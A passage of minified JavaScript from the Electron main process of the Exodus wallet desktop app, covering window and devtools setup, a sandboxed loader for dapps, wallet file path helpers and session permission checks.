						mode: "bottom"
					},
					unlock: {
						mode: "detach"
					}
				},
				n = e => Object.keys(e).sort().join("|");
			try {
				if (n(e = await i.a.readJson(u, "utf8")) !== n(t)) throw new Error(`Keys mismatch in ${u}`)
			} catch (n) {
				"ENOENT" === n.code ? console.log(`Exodus DevTools configuration file does not exist, so creating a default in '${u}'.`) : console.error(n), e = t;
				try {
					await i.a.writeJson(u, e, {
						spaces: 2
					})
				} catch (e) {
					console.error(e)
				}
			}
			this._options = e[this._windowId]
		}
		show() {
			if (!this._options) return;
			let e;
			if ("number" == typeof this._windowHandle) e = r.BrowserWindow.fromId(this._windowHandle).webContents;
			else if (null == this._windowHandle) e = Object(a.a)().webContents;
			else if ("function" == typeof this._windowHandle.constructor)
				if ("BrowserWindow" === this._windowHandle.constructor.name) e = this._windowHandle.webContents;
				else {
					if (!this._windowHandle.openDevTools) throw new Error("#devtools.show() Unknown constructor.");
					e = this._windowHandle
				} if (!e) return console.error("Can't show #devtools.");
			let t = "ui" === this._windowId ? {
				mode: "detach"
			} : this._options;
			e.openDevTools(t)
		}
	}
	async function f(e = {
		windowHandle: null,
		windowId: "devMenu"
	}) {
		if (s.h) return;
		const t = new l(e);
		(s.e || Object(c.a)()) && await t.readConf(), t.show()
	}
}, function(e, t, n) {
	const r = n(92),
		o = e => "-" === e || Array.isArray(e) && "-" === e[0],
		i = e => "function" == typeof e,
		s = e => r.includes(e);
	e.exports = function e(t) {
		return Array.isArray(t) ? 0 === t.length ? [] : o(t[0]) ? {
			type: "separator"
		} : "string" != typeof t[0] ? t.map(e) : t.slice(1).reduce((t, n) => i(n) ? Object.assign(t, {
			click: n
		}) : s(n) ? Object.assign(t, {
			role: n
		}) : Array.isArray(n) ? Object.assign(t, {
			submenu: e(n)
		}) : "object" == typeof n ? Object.assign(t, n) : "string" == typeof n ? Object.assign(t, {
			accelerator: n
		}) : void 0, {
			label: t[0]
		}) : o(t) ? {
			type: "separator"
		} : t
	}
}, function(e, t) {
	e.exports = require("url")
}, function(e, t, n) {
	"use strict";
	n.d(t, "a", function() {
		return i
	});
	var r = n(6),
		o = n(3);

	function i(e, t) {
		if (!t) throw new Error("fromWindow is required!");
		e.on("console-message", (e, n, i, s, c) => {
			if ("ui" === t && /^Error in [^ ]+ window:/.test(i)) return;
			if (i.includes("the following Content Security Policy directive:")) {
				const e = i.replace(/the following Content Security Policy directive:[\s\S]*/, "CSP").replace(/ because it violates CSP$/, "");
				Object(r.a)("Content Security Policy violation", ` in ${t} window (${e})`)
			}
			if (n < 3) return;
			if ("ui" === t || !o.a.ui) return;
			const a = {
				level: n,
				message: i,
				line: s,
				sourceId: c,
				window: t
			};
			o.a.ui.webContents.send("errors:remote-error", a)
		})
	}
}, function(e, t, n) {
	const {
		BrowserWindow: r
	} = n(0);
	const o = new Set;

	function i(e) {
		for (const t of r.getAllWindows())
			if (t.getBrowserViews().includes(e)) return t;
		return null
	}
	e.exports = {
		browserViewFromWebContents: function(e) {
			for (const t of o)
				if (t.webContents === e) return t;
			return null
		},
		browserWindowFromBrowserView: i,
		registerBrowserView: function(e) {
			o.add(e)
		},
		destroyBrowserView: function(e) {
			const t = i(e);
			t && t.removeBrowserView(e), e.webContents.destroy(), o.delete(e)
		},
		allWebContents: function() {
			return [...r.getAllWindows(), ...o].map(e => e.webContents)
		}
	}
}, function(e, t, n) {
	"use strict";
	t.fromCallback = function(e) {
		return Object.defineProperty(function() {
			if ("function" != typeof arguments[arguments.length - 1]) return new Promise((t, n) => {
				arguments[arguments.length] = ((e, r) => {
					if (e) return n(e);
					t(r)
				}), arguments.length++, e.apply(this, arguments)
			});
			e.apply(this, arguments)
		}, "name", {
			value: e.name
		})
	}, t.fromPromise = function(e) {
		return Object.defineProperty(function() {
			const t = arguments[arguments.length - 1];
			if ("function" != typeof t) return e.apply(this, arguments);
			e.apply(this, arguments).then(e => t(null, e)).catch(t)
		}, "name", {
			value: e.name
		})
	}
}, function(e, t, n) {
	"use strict";
	t.fromCallback = function(e) {
		return Object.defineProperty(function(...t) {
			if ("function" != typeof t[t.length - 1]) return new Promise((n, r) => {
				e.call(this, ...t, (e, t) => null != e ? r(e) : n(t))
			});
			e.apply(this, t)
		}, "name", {
			value: e.name
		})
	}, t.fromPromise = function(e) {
		return Object.defineProperty(function(...t) {
			const n = t[t.length - 1];
			if ("function" != typeof n) return e.apply(this, t);
			e.apply(this, t.slice(0, -1)).then(e => n(null, e), n)
		}, "name", {
			value: e.name
		})
	}
}, function(e, t, n) {
	"use strict";
	n.d(t, "a", function() {
		return f
	}), n.d(t, "c", function() {
		return p
	}), n.d(t, "b", function() {
		return h
	});
	var r = n(0),
		o = (n(1), n(15)),
		i = n(8),
		s = n(14),
		c = n(37),
		a = n(10),
		u = n(26);
	let l = null;
	const f = () => l,
		d = (e, t) => {
			const {
				height: n,
				width: r,
				titleBarHeight: o
			} = Object(c.a)(t);
			e.setBounds({
				x: 0,
				y: o,
				width: r,
				height: n
			})
		},
		p = new Set;

	function h(e) {
		return l = new r.BrowserView({
			webPreferences: {
				...a.b,
				partition: "persist:main",
				backgroundThrottling: !1,
				backgroundColor: "#00000000",
				transparent: !0
			},
			transparent: !0
		}), Object(i.registerWebContents)(l.webContents, "ui"), Object(o.registerBrowserView)(l), Object(s.a)(l.webContents, "ui"), l.setAutoResize({
			width: !0,
			height: !0
		}), e.addBrowserView(l), d(l, e), l.webContents.on("will-navigate", (e, t) => {
			t.startsWith("mailto:") || e.preventDefault()
		}), l.webContents.setWindowOpenHandler(e => ({
			action: "deny"
		})), u.c.add(() => d(l, e)), l
	}
}, function(e, t, n) {
	"use strict";
	const r = (0, n(16).fromCallback)(n(143)),
		o = n(142);
	e.exports = {
		mkdirs: r,
		mkdirsSync: o,
		mkdirp: r,
		mkdirpSync: o,
		ensureDir: r,
		ensureDirSync: o
	}
}, function(e, t, n) {
	"use strict";
	n.r(t);
	var r = n(29),
		o = n.n(r),
		i = n(28),
		s = n(0),
		c = n(51),
		a = n(13),
		u = n(2),
		l = n(15),
		f = n(4),
		d = n(6),
		p = n(8),
		h = n(3);
	var y = `(${function(e){const t={items:new Map(e),get length(){return this.items.size},key(e){return Array.from(this.items.keys())[Number(e)]},getItem(e){return this.items.get(String(e))},setItem(e,t){[e,t]=[e,t].map(String),this.items.set(e,t),window._exodus_dapp_api.rpc.callMethod("setLocalStorageItem",[e,t]).catch(e=>console.error("Failed to set local storage value",e))},removeItem(e){e=String(e);const t=this.items.delete(e);return window._exodus_dapp_api.rpc.callMethod("deleteLocalStorageItem",[e]).catch(e=>console.error("Failed to delete local storage value",e)),t},clear(){this.items.clear(),window._exodus_dapp_api.rpc.callMethod("clearLocalStorageItems").catch(e=>console.error("Failed to clear local storage values",e))}};Object.defineProperty(window,"localStorage",{value:new Proxy(t,{has:(e,t)=>e.items.has(t)||t in e,get:(e,t)=>t in e?e[t]:e.getItem(t),set:(e,t,n)=>e.setItem(t,n),deleteProperty:(e,t)=>e.removeItem(t)})})}})`,
		m = n(9),
		w = n.n(m),
		b = n(1),
		g = n(84),
		v = n.n(g),
		E = n(65),
		S = n.n(E);
	const k = e => new Promise((t, n) => {
			const r = v()(),
				o = new Map;
			r.on("error", n), r.on("finish", () => t(new Map(Array.from(o, ([e, t]) => [e, Buffer.concat(t)])))), r.on("entry", (e, t, r) => {
				if ("directory" === e.type) return r();
				if ("file" !== e.type) return n(new Error("Dapp tarball should contain only regular files and directories"));
				const i = b.posix.normalize(e.name);
				return function(e) {
					return !(e.length < 1 || e.length > 1024 || e.includes("..") || e.includes("//") || e.startsWith("/") || e.endsWith("/") || !/^[a-zA-Z0-9\-_./]+$/.test(e))
				}(i) ? o.has(i) ? n(new Error(`Found duplicate tar archive entry while reading cached dapp: ${e.name}`)) : (o.set(i, []), t.on("end", () => r()), t.on("data", e => o.get(i).push(e)), void t.resume()) : n(new Error(`Found unexpected path in tar archive while reading cached dapp: ${e.name}`))
			}), S.a.unzip(e, (e, t) => {
				if (e) return n(e);
				r.end(t)
			})
		}),
		x = {
			".html": "text/html",
			".js": "text/javascript",
			".css": "text/css",
			".json": "application/json",
			".png": "image/png",
			".jpg": "image/jpg",
			".gif": "image/gif",
			".svg": "image/svg+xml",
			".wav": "audio/wav",
			".mp4": "video/mp4",
			".woff": "application/font-woff",
			".ttf": "application/font-ttf",
			".eot": "application/vnd.ms-fontobject",
			".otf": "application/font-otf",
			".wasm": "application/wasm",
			".webp": "image/webp"
		},
		O = () => ({
			status: 404,
			headers: {
				"Content-Type": "text/html"
			},
			body: "<h1>Error: 404, not found</h1>"
		});
	var C = n(37),
		j = n(26),
		_ = n(18);
	n.d(t, "updateAllViewsBounds", function() {
		return L
	}), n.d(t, "schemes", function() {
		return I
	}), n.d(t, "showDevTools", function() {
		return $
	}), n.d(t, "updateViewBounds", function() {
		return U
	}), n.d(t, "refocusView", function() {
		return R
	}), n.d(t, "toInputEvent", function() {
		return W
	});
	const F = ({
			body: e,
			headers: t,
			status: n
		}) => {
			const r = new c.PassThrough;
			return r.end(e), {
				statusCode: n,
				headers: t,
				data: r
			}
		},
		P = new Map;
	let D = null;
	const B = e => {
		h.a.background.removeBrowserView(e), D === e && (D = null, h.a.ui.webContents.focus())
	};
	let T = 0;
	const L = e => {
			T = e || T;
			const t = h.a.ui.webContents.zoomFactor,
				n = Math.round(T * t),
				{
					height: r,
					width: o,
					titleBarHeight: i
				} = Object(C.a)(h.a.background);
			for (let e of P.values()) e.setBounds({
				x: 0,
				y: n + i,
				width: o,
				height: r - n
			})
		},
		I = [{
			scheme: "exodus-dapp-api",
			privileges: {
				bypassCSP: !0,
				secure: !0,
				supportFetchAPI: !0
			}
		}];
	s.protocol.registerSchemesAsPrivileged(I);
	const N = new Set,
		M = (e, t) => {
			f.rpcMain.handle(`dapp:${e}`, (e, n, ...r) => {
				if (!N.has(n)) return t(n, ...r)
			})
		};
	let A = 0;
	const $ = e => {
			e.webContents.isDevToolsOpened() || e.webContents.openDevTools({
				mode: "detach"
			})
		},
		U = (e, t) => {
			const n = h.a.ui.webContents.zoomFactor;
			e.webContents.zoomFactor = n;
			const r = Math.round(t * n),
				{
					height: o,
					width: i,
					titleBarHeight: s
				} = Object(C.a)(h.a.background);
			e.setBounds({
				x: 0,
				y: r + s,
				width: i,
				height: o - r
			})
		};
	j.c.add(() => L()), _.c.add(L), M("load", async (e, {
		tar: t,
		url: n,
		domains: r,
		localStorageContent: c
	}) => {
		let f;
		if (t) {
			if (n) throw new Error("tar and url arguments are mutually exclusive!");
			n = `http://${"127.0.0.1:1021"}/`, f = await async function(e) {
				const t = await w.a.readFile(e),
					n = await k(t),
					r = e => {
						const t = b.posix.extname(e),
							r = b.posix.normalize(e);
						if (!n.has(r)) return O();
						const o = n.get(r);
						return {
							status: 200,
							headers: {
								"Referrer-Policy": "strict-origin",
								"X-Frame-Options": "SAMEORIGIN",
								"X-Content-Type-Options": "nosniff",
								"X-XSS-Protection": "1; mode=block",
								"Content-Type": x.hasOwnProperty(t) ? x[t] : "application/octet-stream"
							},
							body: o
						}
					};
				return r.notFound = O, r
			}(t)
		}
		const m = new s.BrowserView({
			webPreferences: {
				webSecurity: !0,
				contextIsolation: !0,
				enableRemoteModule: !1,
				nodeIntegration: !1,
				partition: `dapp-${A++}`,
				sandbox: !0,
				spellcheck: !1,
				webgl: !1,
				plugins: !1,
				safeDialogs: !0,
				disableDialogs: !0,
				backgroundColor: "#00000000",
				transparent: !0
			},
			transparent: !0
		});
		Object(p.registerWebContents)(m.webContents, "dapp", {
			url: n,
			domains: r
		}), Object(l.registerBrowserView)(m), P.set(e, m), U(m, T), m.setAutoResize({
			width: !0,
			height: !0
		}), h.a.ui.webContents.on("devtools-reload-page", () => {
			B(m), Object(l.destroyBrowserView)(m)
		});
		const g = m.webContents.session;
		g.setPermissionRequestHandler((e, t, n) => {
			return n(!1)
		}), g.setPermissionCheckHandler(() => !1);
		const v = Object(i.randomBytes)(20).toString("hex");
		g.protocol.registerStringProtocol("exodus-dapp-api", (t, n) => {
			if (N.has(e)) return;
			try {
				const n = new a.URL(t.url),
					r = n.searchParams.get("data"),
					o = n.searchParams.get("token");
				if (!r || !o) throw new Error("No message or no CSRF token found in dapp IPC request!");
				if (o !== v) throw new Error("exodus-dapp-api: got a message with mismatching token!");
				h.a.ui.webContents.send("exodus-dapp-api", {
					messageString: r,
					dappUid: e
				})
			} catch (e) {
				console.error("Could not parse exodus-dapp-api request!"), console.error(e)
			}
			n({
				mimeType: "text/plain",
				data: "ok"
			})
		}), f && g.protocol.interceptStreamProtocol("http", (e, t) => {
			if ("GET" === e.method && e.url.startsWith(n)) {
				const r = e.url.slice(n.length) || "index.html";
				t(F(f(r)))
			} else Object(d.a)("loading of unexpected http:// url from dapp", `: ${e.url}`), t(F(f.notFound()))
		}), u.e && $(m), await m.webContents.loadURL(n);
		const E = JSON.parse(c);
		await m.webContents.executeJavaScript(`${y}(${o()(E)}),0`), await m.webContents.executeJavaScript("\n      document.addEventListener('mouseover', ({ target }) => {\n        const { cursor } = getComputedStyle(target);\n        window._exodus_dapp_api.rpc.callMethod('setCursorStyle', [cursor])\n      }),0"), m.webContents.debugger.attach("1.3");
		try {
			return await m.webContents.executeJavaScript(`window._exodus_dapp_api.setToken(${o()(v)}),0`), {
				usingSDK: !0
			}
		} catch (t) {
			return console.error(`failed to set CSRF token on dapp ${e} : ${t}`), {
				usingSDK: !1
			}
		}
	}), M("showDevTools", e => {
		const t = P.get(e);
		$(t)
	}), M("show", e => {
		const t = P.get(e);
		h.a.background.addBrowserView(t), h.a.background.setTopBrowserView(h.a.ui), D = t, U(t, T), R(t)
	});
	const R = e => {
		e.webContents.focus(), e.webContents.sendInputEvent({
			type: "mouseDown",
			x: 0,
			y: 0,
			button: "left",
			clickCount: 1
		}), e.webContents.sendInputEvent({
			type: "mouseUp",
			x: 0,
			y: 0,
			button: "left"
		})
	};
	M("hide", e => {
		const t = P.get(e);
		B(t)
	}), M("goBack", e => {
		const t = P.get(e),
			n = t.webContents.canGoBack();
		return n && t.webContents.goBack(), n
	}), M("api-receive", async (e, {
		dataString: t
	}) => {
		const n = P.get(e),
			r = JSON.stringify(JSON.parse(t));
		await n.webContents.executeJavaScript(`window._exodus_dapp_api.receive(${o()(r)}),0`)
	}), M("disable", e => {
		N.add(e);
		const t = P.get(e);
		P.delete(e), t && (B(t), Object(l.destroyBrowserView)(t))
	});
	const W = e => {
		const {
			type: t,
			offsetX: n,
			offsetY: r,
			deltaX: o,
			deltaY: i
		} = e, s = ["left", "middle", "right"][Number(e.button)] || null;
		switch (t) {
			case "mousedown":
				return s ? {
					type: "mousePressed",
					x: n,
					y: r,
					button: s,
					clickCount: 1
				} : null;
			case "click":
				return s ? {
					type: "mouseReleased",
					x: n,
					y: r,
					button: s,
					clickCount: 1
				} : null;
			case "mouseup":
				return s ? {
					type: "mouseReleased",
					x: n,
					y: r,
					button: s
				} : null;
			case "mousemove":
				return {
					type: "mouseMoved", x: n, y: r, button: s || "none"
				};
			case "wheel":
				return {
					type: "mouseWheel", x: n, y: r, deltaX: o, deltaY: i
				}
		}
		return console.error(`Unprocessed input event: ${t}`), null
	};
	f.rpcMain.on("dapps:pointer", (e, t) => {
		const n = W(t);
		if (!n || !D) return;
		const r = D;
		["mousedown", "click"].includes(t.type) && r.webContents.focus(), r.webContents.debugger.sendCommand("Input.dispatchMouseEvent", n)
	})
}, function(e, t, n) {
	const r = !1,
		o = {
			MAIN: 1,
			RENDERER: 2
		},
		i = {
			BEGIN: "B",
			END: "E",
			INSTANT: "i"
		},
		s = [];

	function c(e) {
		return r ? t => {
			const n = {
				name: t,
				pid: o.MAIN,
				ph: e,
				cat: "PERF",
				timestamp: Date.now()
			};
			e === i.INSTANT && (n.s = "p"), s.push(n)
		} : () => {}
	}
	e.exports = {
		PERF_METRICS_FEATURES: r,
		beginEvent: c(i.BEGIN),
		endEvent: c(i.END),
		instantEvent: c(i.INSTANT),
		getTimeOrigin: () => null,
		getTrace: e => s.map(t => {
			const {
				timestamp: n,
				...r
			} = t;
			return {
				...r,
				ts: 1e3 * (n - e)
			}
		})
	}
}, function(e, t, n) {
	"use strict";
	const r = n(17).fromPromise,
		{
			makeDir: o,
			makeDirSync: i
		} = n(175),
		s = r(o);
	e.exports = {
		mkdirs: s,
		mkdirsSync: i,
		mkdirp: s,
		mkdirpSync: i,
		ensureDir: s,
		ensureDirSync: i
	}
}, function(e, t, n) {
	"use strict";
	let r;

	function o() {
		return "boolean" == typeof r ? r : globalThis.DEBUG_MODE
	}
	n.d(t, "a", function() {
		return o
	})
}, function(e, t, n) {
	"use strict";
	n.d(t, "a", function() {
		return c
	});
	var r = n(1),
		o = n.n(r),
		i = n(13),
		s = n.n(i);
	const c = ({
		app: e,
		filePath: t,
		hash: n,
		query: r
	}) => {
		const i = {
			protocol: "file",
			slashes: !0,
			pathname: o.a.resolve(e.getAppPath(), t),
			hash: n,
			query: r
		};
		return s.a.format(i)
	}
}, function(e, t, n) {
	"use strict";

	function r(e = null) {
		return e ? encodeURIComponent(JSON.stringify(e)) : ""
	}
	n.d(t, "a", function() {
		return r
	})
}, function(e, t, n) {
	"use strict";
	n.d(t, "c", function() {
		return h
	}), n.d(t, "a", function() {
		return y
	}), n.d(t, "b", function() {
		return m
	});
	var r = n(0),
		o = n(68),
		i = n.n(o),
		s = n(2),
		c = n(4),
		a = n(8),
		u = n(5),
		l = n(10);
	const f = (() => {
			const e = [];
			return s.c && e.push("EXODUS"), s.b && e.push("EDEN"), e.push(s.n.version), s.n.version.includes("-") && e.push("[PRERELEASE]"), s.e && e.push("[DEV]"), s.m && e.push("[NIGHTLY BUILD]"), e.join(" ")
		})(),
		d = {
			...l.a,
			width: s.l,
			height: s.k,
			minWidth: s.l,
			minHeight: s.k,
			title: f,
			webPreferences: {
				webSecurity: !0,
				contextIsolation: !0,
				enableRemoteModule: !1,
				nodeIntegration: s.h,
				sandbox: !0,
				spellcheck: !1,
				partition: "background"
			}
		};
	let p = null;
	const h = new Set;

	function y(e) {
		const t = i()({
			defaultWidth: d.width,
			defaultHeight: d.height,
			maximize: !1,
			fullScreen: !1
		});
		"string" == typeof e && (d.title = d.title + ` (${e})`), p = new r.BrowserWindow({
			...d,
			...t
		}), Object(a.registerWebContents)(p.webContents, "background"), t.manage(p), p.webContents.loadFile(u.a), p.on("close", () => {
			for (const e of p.getBrowserViews()) p.removeBrowserView(e)
		});
		const n = () => {
			for (const e of h) e()
		};
		let o = new Map;
		const s = e => {
			for (const t of [e, 200, 500, 2e3]) clearTimeout(o.get(t)), o.set(t, setTimeout(n, t))
		};
		return "linux" === process.platform && (p.on("maximize", () => {
			n(), s(20)
		}), p.on("resize", () => s(100))), p.on("focus", () => Object(c.targeted)("ui", "window:onfocus")), p.on("blur", () => Object(c.targeted)("ui", "window:onblur")), r.powerMonitor.on("suspend", () => {
			Object(c.targeted)("ui", "window:onfreeze")
		}), r.powerMonitor.on("resume", () => {
			Object(c.targeted)("ui", "window:onresume")
		}), p
	}

	function m(e) {
		const t = i()({
			defaultWidth: d.width,
			defaultHeight: d.height,
			maximize: !1,
			fullScreen: !1
		});
		["linux", "win32"].includes(process.platform) && t.isMaximized && e.maximize()
	}
}, function(e, t) {
	e.exports = require("fs")
}, function(e, t) {
	e.exports = require("crypto")
}, function(e, t, n) {
	"use strict";
	const {
		toISOString: r
	} = Date.prototype, o = e => {
		if ([1 / 0, -1 / 0, NaN, void 0, null].includes(e)) return `${e}`;
		if (!["string", "boolean", "number"].includes(typeof e)) {
			if ("object" != typeof e) throw new Error("Unexpected value type");
			const t = Object.getPrototypeOf(e);
			if (t === Date.prototype && e.toISOString === r) return `new Date(${o(r.call(e))})`;
			if (!(t === Array.prototype && Array.isArray(e) || t === Object.prototype)) throw new Error("Unexpected object given as value")
		}
		return JSON.stringify(e).replace(/([{,])"__proto__":/g, '$1["__proto__"]:').replace(/[^\\]"__proto__":/g, () => {
			throw new Error("Unreachable")
		}).replace(/[\u2028\u2029]/g, e => (e => `\\u${e.toString(16).padStart(4,"0")}`)(e.charCodeAt(0)))
	};
	e.exports = o
}, function(e, t, n) {
	"use strict";
	n.d(t, "a", function() {
		return a
	}), n.d(t, "c", function() {
		return l
	});
	var r = n(9),
		o = n.n(r),
		i = n(1),
		s = n.n(i),
		c = n(2);
	const a = "exodus.wallet",
		u = e => ({
			get infoFile() {
				return s.a.join(e, "info.seco")
			},
			async infoFileExists() {
				return o.a.pathExists(this.infoFile)
			},
			get passphraseFile() {
				return s.a.join(e, "passphrase.json")
			},
			async passphraseFileExists() {
				return o.a.pathExists(this.passphraseFile)
			},
			get seedFile() {
				return s.a.join(e, "seed.seco")
			},
			async seedFileExists() {
				return o.a.pathExists(this.seedFile)
			},
			get seedBackupFile() {
				return this.seedFile + ".bak"
			},
			async seedBackupFileExists() {
				return o.a.pathExists(this.seedBackupFile)
			},
			get storageFile() {
				return s.a.join(e, "storage.seco")
			},
			get twoFactorFile() {
				return s.a.join(e, "twofactor.seco")
			},
			get twoFactorSecretFile() {
				return s.a.join(e, "twofactor-secret.seco")
			},
			async twoFactorFileExists() {
				return o.a.pathExists(this.twoFactorFile)
			},
			async twoFactorSecretFileExists() {
				return o.a.pathExists(this.twoFactorSecretFile)
			},
			get lightningFile() {
				return s.a.join(e, "lightning-v2.seco")
			},
			get lightningSecretFile() {
				return s.a.join(e, "lightning-secret-v2.seco")
			},
			async lightningFileExists() {
				return o.a.pathExists(this.lightningFile)
			},
			async lightningSecretFileExists() {
				return o.a.pathExists(this.lightningSecretFile)
			},
			async walletExists() {
				const e = await this.seedFileExists(),
					t = await this.twoFactorFileExists();
				return e || t
			},
			get walletDir() {
				return e
			},
			get restoreFromCurrentPhraseFlagFile() {
				return s.a.join(e, "..", c.i)
			},
			restoreFromCurrentPhraseFlagFileExistsSync() {
				return o.a.pathExistsSync(this.restoreFromCurrentPhraseFlagFile)
			}
		});

	function l(e) {
		return s.a.join(e, a)
	}
	t.b = u
}, function(e, t, n) {
	"use strict";
	const r = n(16).fromPromise,
		o = n(80);
	e.exports = {
		pathExists: r(function(e) {
			return o.access(e).then(() => !0).catch(() => !1)
		}),
		pathExistsSync: o.existsSync
	}
}, function(e, t) {
	e.exports = require("util")
}, function(e, t) {
	e.exports = require("os")
}, function(e, t, n) {
	"use strict";
	n.d(t, "b", function() {
		return c
	}), n.d(t, "d", function() {
		return a
	}), n.d(t, "c", function() {
		return u
	});
	var r = n(1),
		o = n.n(r),
		i = n(30),
		s = (n(2), n(39));

	function c() {
		return o.a.join(Object(s.dataDir)(), "images")
	}

	function a() {
		return o.a.join(Object(s.dataDir)(), i.a)
	}

	function u() {
		return o.a.join(o.a.join(Object(s.dataDir)(), "backups"), "wallet")
	}
	n.d(t, "a", function() {
		return s.dataDir
	})
}, function(e, t, n) {
	"use strict";
	t.reduce = function(e, t, n) {
		for (var r = 0; r < e.length; ++r) n = t(n, e[r], r, e);
		return n
	}, t.isAbstractCodec = function(e) {
		return e && "function" == typeof e.encode && "function" == typeof e.decode && "function" == typeof e.encodingLength
	}
}, function(e, t, n) {
	"use strict";
	const r = n(17).fromPromise,
		o = n(43);
	e.exports = {
		pathExists: r(function(e) {
			return o.access(e).then(() => !0).catch(() => !1)
		}),
		pathExistsSync: o.existsSync
	}
}, function(e, t, n) {
	"use strict";
	t.a = (e => {
		const {
			height: t,
			width: n
		} = e.webContents.getOwnerBrowserWindow().getContentBounds(), r = e.webContents.getOwnerBrowserWindow().getBounds().height - t;
		return {
			height: t,
			width: n,
			titleBarHeight: "win32" === process.platform ? 0 : r
		}
	})
}, function(e, t, n) {
	"use strict";
	n.d(t, "a", function() {
		return d
	}), n.d(t, "b", function() {
		return p
	});
	var r = n(0),
		o = n(2),
		i = n(25),
		s = n(8),
		c = n(5),
		a = n(10),
		u = n(24);
	const l = {
		...a.a,
		frame: !1,
		transparent: !0,
		fullscreen: !1,
		fullscreenable: !1,
		roundedCorners: !1,
		width: 700,
		height: o.p,
		resizable: !1,
		show: !1,
		title: "UNLOCK WALLET",
		modal: !0,
		webPreferences: {
			...a.c,
			partition: "unlock"
		}
	};
	let f = null;
	const d = () => f;

	function p(e, t) {
		f = new r.BrowserWindow({
			...l,
			parent: e
		}), Object(s.registerWebContents)(f.webContents, "unlock"), f.loadURL(Object(u.a)({
			app: r.app,
			hash: Object(i.a)(t),
			filePath: c.j
		}));
		let n = !1;
		return r.app.on("before-quit", () => {
			n = !0, f.isDestroyed() || f.close()
		}), f.on("close", e => {
			n || (e.preventDefault(), f.send("unlock:window-close"))
		}), f
	}
}, function(e, t, n) {
	e.exports = n(156)
}, function(e, t, n) {
	"use strict";
	n.d(t, "a", function() {
		return p
	}), n.d(t, "b", function() {
		return h
	});
	var r = n(0),
		o = n(25),
		i = n(8),
		s = n(11),
		c = n(14),
		a = n(5),
		u = n(10),
		l = n(24);
	const f = {
		...u.a,
		backgroundColor: "#fff",
		x: 0,
		y: 0,
		fullscreen: !1,
		fullscreenable: !1,
		maximizable: !1,
		minimizable: !1,
		resizable: !0,
		show: !1,
		skipTaskbar: !1,
		title: "Wallet Process (hidden window)",
		webPreferences: {
			...u.b,
			partition: "persist:wallet",
			backgroundThrottling: !1
		}
	};
	let d = null;
	const p = () => d;

	function h(e) {
		const t = r.screen.getPrimaryDisplay().size,
			n = {
				...f,
				width: t.width / 3,
				height: t.height / 2
			};
		d = new r.BrowserWindow(n), Object(i.registerWebContents)(d.webContents, "wallet"), Object(c.a)(d.webContents, "wallet"), d.loadURL(Object(l.a)({
			app: r.app,
			hash: Object(o.a)(e),
			filePath: a.k
		})), Object(s.a)({
			windowHandle: d.webContents,
			windowId: "wallet"
		}), d.webContents.on("will-navigate", e => {
			e.preventDefault()
		});
		let u = !1;
		return r.app.on("before-quit", () => {
			u = !0, d.isDestroyed() || d.close()
		}), d.on("close", function(e) {
			u || (e.preventDefault(), d.hide())
		}), d
	}
}, function(e, t, n) {
	"use strict";
	n.d(t, "b", function() {
		return d
	}), n.d(t, "a", function() {
		return p
	}), n.d(t, "c", function() {
		return h
	}), n.d(t, "d", function() {
		return m
	});
	var r = n(0),
		o = n(6);
	const i = new WeakMap,
		s = new WeakMap,
		c = new Set,
		a = new Map,
		u = new WeakMap,
		l = new WeakSet,
		f = new WeakMap;

	function d(e) {
		const t = s.get(e);
		return {
			permissions: t && t.permissions || [],
			downloads: t && t.downloads || []
		}
	}

	function p(e, t) {
		u.has(e) || u.set(e, {
			firstUrl: t
		});
		const n = u.get(e);
		if (function(e) {
				return e === r.session.defaultSession || l.has(e)
			}(e)) return Object(o.a)("invalidated session usage", ` by ${t}`), null;
		if (!n.webContents || n.webContents && n.webContents.isDestroyed()) {
			const r = i.get(e);
			if (!r) return Object(o.a)("missing WebContents for session", `: ${t}`), null;
			if (r.isDestroyed()) return "block_silent";
			if (r.session !== e) return Object(o.a)("changed WebContents session", `: ${t}`), null;
			n.webContents = r
		}
		if (["devtools:", "chrome-extension:"].includes(t.protocol)) return {
			protocols: "*",
			domains: "*"
		};
		if (!n.sessionRules) {
			if (!s.has(e)) return Object(o.a)("unregistered session usage", ` by ${t}`), null;
			const r = s.get(e);
			if (!r.startUrlProtocolIsIntercepted && !r.url.startsWith("file://") && f.get(n.webContents) !== `${t}` || f.get(n.webContents) !== r.url) return Object(o.a)("start url mismatch for WebContents", ` by ${t}`), l.add(e), null;
			const {
				protocols: i,
				domains: c
			} = r;
			n.sessionRules = {
				protocols: i,
				domains: c
			}
		}
		return n.sessionRules
	}

	function h(e, t) {
		const {
			type: n,
			persistName: i = n
		} = t, {
			session: u
		} = e;
		if (u !== r.session.defaultSession)
			if (Boolean(t.persistent) !== u.isPersistent() || t.persistent && u !== r.session.fromPartition(`persist:${i}`)) Object(o.a)('persistent session does not match "persist:" prefix', `: ${n}`, 2);
			else {
				if (c.has(n) ? t.multiple || (Object(o.a)("reuse of single-use WebContents type", `: ${n}`, 1, !1), l.add(u)) : c.add(n), t.multiple && !t.parallel && (a.has(n) && a.get(n).isDestroyed() && a.delete(n), a.has(n) ? (Object(o.a)("reuse of exclusive-use WebContents type", `: ${n}`, 1, !1), l.add(u)) : (a.set(n, e), e.on("destroyed", () => {
						a.get(n) === e && a.delete(n)
					}))), s.has(u)) return t.reusable || (Object(o.a)("reuse of single-use WebContents session", `: ${n}`, 1, !1), l.add(u)), void(s.get(u).type !== n && (Object(o.a)("reuse of WebContents session with mismatching type", `: ${n}`, 1, !1), l.add(u)));
				if (s.set(u, t), t.flags.has("trezor-origin")) {
					const e = "http://127.0.0.1:21325",
						t = {
							urls: [`${e}/*`]
						};
					u.webRequest.onBeforeSendHeaders(t, (t, n) => {
						new URL(t.url).origin === e && (t.requestHeaders.Origin = "https://node.trezor.io"), n({
							requestHeaders: t.requestHeaders
						})
					})
				}
			}
		else Object(o.a)("usage of default session", `: ${n}`, 2)
	}

	function y(e) {
		return (e || "").replace(/#.*/, "").replace(/^(devtools:\/\/devtools\/bundled\/devtools_app\.html)(\?.*)?$/, "$1")
	}

	function m(e) {
		const t = y(e.getURL());
		t && w(e, t), e.once("did-start-navigation", (n, r) => {
			const i = y(r.toString()),
				s = y(e.getURL());
			if (t) {
				if (i !== t || s !== t) {
					const e = JSON.stringify({
						url: i,
						url1: s,
						url0: t
					});
					Object(o.a)("content.getURL() / navigationUrl mismatched initial navigation:", e, 1, !1)
				}
			} else w(e, i)
		})
	}

	function w(e, t) {
		if (t.startsWith("devtools://")) return;
		if (!e.session) return void Object(o.a)("missing session for WebContents", `: ${t}`, 1, !1);
		const {
			session: n
		} = e;
		if (n !== r.session.defaultSession) {
			if (!l.has(n)) {
				if (s.has(n)) {
					if (i.has(n)) {
